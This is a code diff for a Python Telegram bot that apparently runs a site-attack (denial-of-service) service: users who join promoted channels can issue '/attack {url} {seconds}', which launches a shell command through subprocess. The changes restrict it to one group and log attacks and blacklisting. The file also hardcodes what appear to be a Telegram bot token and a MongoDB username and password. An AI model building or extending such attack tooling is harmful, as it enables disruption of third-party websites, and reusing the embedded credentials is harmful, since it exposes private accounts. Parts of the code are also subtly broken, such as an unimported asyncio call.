@@ -2,7 +2,7 @@ import os
 import subprocess
 import time
 import threading
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext, filters
 from pymongo import MongoClient
 
@@ -10,8 +10,9 @@ from pymongo import MongoClient
 BOT_TOKEN = "7417294211:AAHD5mhZ2JUNN-PtcsAq75WwxFiG3I1Yx7k"
 OWNER_IDS = [5606990991, 5460343986]
 MONGO_URL = "mongodb+srv://mpjmu808gh:8sqqX0ERW0IMtviu@cluster0.zo6rkop.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
-WEBAPP_URL = "https://iosmirror.cc/home?app=1"
-CHANNELS = ["@Falcon_Security", "@Pbail_squad", "@Found_Us", "@Bot_Colony"]
+CHANNELS = ["@Falcon_Security", "@Pbail_Squad", "@Found_Us", "@Bot_Colony"]
+ALLOWED_GROUP_ID = -1002239204465
+LOG_GROUP_ID = -1002155266073
 
 # MongoDB Client Setup
 client = MongoClient(MONGO_URL)
@@ -22,12 +23,24 @@ stats_collection = db["stats"]
 # Global Variables
 active_attacks = {}
 
+# Log Function
+async def log_activity(message):
+    # Send log message to the log group
+    await app.bot.send_message(LOG_GROUP_ID, message)
+
 # Check if user is blacklisted
 def is_blacklisted(user_id):
     return blacklist_collection.find_one({"user_id": user_id}) is not None
 
+# Check if message is from allowed group
+def is_allowed_group(update):
+    return update.message.chat_id == ALLOWED_GROUP_ID
+
 # Start Command
 async def start(update: Update, context: CallbackContext):
+    if not is_allowed_group(update):
+        return
+
     buttons = [
         [InlineKeyboardButton("Join Falcon Security", url="https://t.me/Falcon_Security"),
          InlineKeyboardButton("Pbail Squad", url="https://t.me/Pbail_Squad")],
@@ -42,18 +55,37 @@ async def start(update: Update, context: CallbackContext):
 
 # Verify Callback Query Handler
 async def verify(update: Update, context: CallbackContext):
+    if not is_allowed_group(update):
+        return
+
     query = update.callback_query
     user_id = query.from_user.id
 
-    if all(context.bot.get_chat_member(channel, user_id).status in ['member', 'administrator', 'creator'] for channel in CHANNELS):
+    # Verify all required channels
+    all_verified = True
+    for channel in CHANNELS:
+        try:
+            member = await context.bot.get_chat_member(channel, user_id)
+            if member.status not in ['member', 'administrator', 'creator']:
+                all_verified = False
+                break
+        except Exception as e:
+            all_verified = False
+            break
+
+    if all_verified:
         await query.edit_message_text("Verification successful! You can now use the bot.\n\n"
                                       "To attack a site, use the command:\n/attack {url} {time in seconds}\n\n"
                                       "Note: Maximum attack duration is 200 seconds. Only 2 attacks can run simultaneously.")
+        await log_activity(f"User {user_id} has been verified successfully.")
     else:
         await query.edit_message_text("Please join all required channels first.")
 
 # Attack Command
 async def attack(update: Update, context: CallbackContext):
+    if not is_allowed_group(update):
+        return
+
     user_id = update.message.from_user.id
     if is_blacklisted(user_id):
         await update.message.reply_text("You are blacklisted and cannot use this bot.")
@@ -88,6 +120,7 @@ def execute_attack(attack_id, update):
     try:
         subprocess.run(command, shell=True, check=True)
         update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
+        asyncio.run(log_activity(f"User {update.message.from_user.id} started an attack on {url} for {duration} seconds."))
     except subprocess.CalledProcessError:
         update.message.reply_text("Failed to start the attack.")
     finally:
@@ -106,6 +139,7 @@ async def blacklist(update: Update, context: CallbackContext):
 
     blacklist_collection.insert_one({"user_id": user_id})
     await update.message.reply_text(f"User {user_id} has been blacklisted.")
+    await log_activity(f"User {user_id} has been blacklisted by {update.message.from_user.id}.")
 
 async def rm_blacklist(update: Update, context: CallbackContext):
     if update.message.from_user.id not in OWNER_IDS:
@@ -119,6 +153,7 @@ async def rm_blacklist(update: Update, context: CallbackContext):
 
     blacklist_collection.delete_one({"user_id": user_id})
     await update.message.reply_text(f"User {user_id} has been removed from the blacklist.")
+    await log_activity(f"User {user_id} has been removed from the blacklist by {update.message.from_user.id}.")
 
 async def stats(update: Update, context: CallbackContext):
     if update.message.from_user.id not in OWNER_IDS:
